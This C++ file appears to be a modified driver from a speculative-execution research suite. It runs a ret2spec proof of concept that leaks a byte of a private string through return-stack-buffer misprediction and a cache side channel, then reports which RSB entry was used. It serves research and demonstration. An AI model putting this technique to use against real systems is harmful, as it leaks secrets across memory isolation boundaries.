/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include <array>
#include <cstring>
#include <iostream>
#include <vector>

#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "ret2spec_common.h"
#include "utils.h"

// Does nothing.
static void NopFunction() {}

// Starts the recursive execution of ReturnsFalse.
static void ReturnsFalseRecursion() {
  ReturnsFalse(kRecursionDepth);
}

int main() {
  return_true_base_case = NopFunction;
  return_false_base_case = ReturnsFalseRecursion;
  
  std::cout << "Testing which RSB entry is used for misprediction...\n";
  std::cout << "RSB mapping: ";
  for (size_t i = 0; i < kRecursionDepth && i < strlen(private_data); ++i) {
    std::cout << "Entry" << i << "=" << private_data[i] << " ";
    if ((i + 1) % 10 == 0) std::cout << "\n             ";
  }
  std::cout << "\n\n";
  
  std::cout << "Running test... ";
  std::cout.flush();
  
  current_offset = 0; // Not used in this version
  char leaked_char = Ret2specLeakByte();
  
  std::cout << "Leaked character: '" << leaked_char << "'\n";
  
  // Determine which RSB entry was used
  bool found = false;
  for (size_t i = 0; i < kRecursionDepth && i < strlen(private_data); ++i) {
    if (private_data[i] == leaked_char) {
      std::cout << "*** RSB entry " << i << " was used for the misprediction! ***\n";
      std::cout << "This corresponds to ReturnsFalse recursion level " << (kRecursionDepth - i) << "\n";
      found = true;
      break;
    }
  }
  
  if (!found) {
    std::cout << "Character '" << leaked_char << "' doesn't match expected RSB entries\n";
    std::cout << "This might indicate a different misprediction pattern\n";
  }
  
  std::cout << "\nDone!\n";
  return 0;
}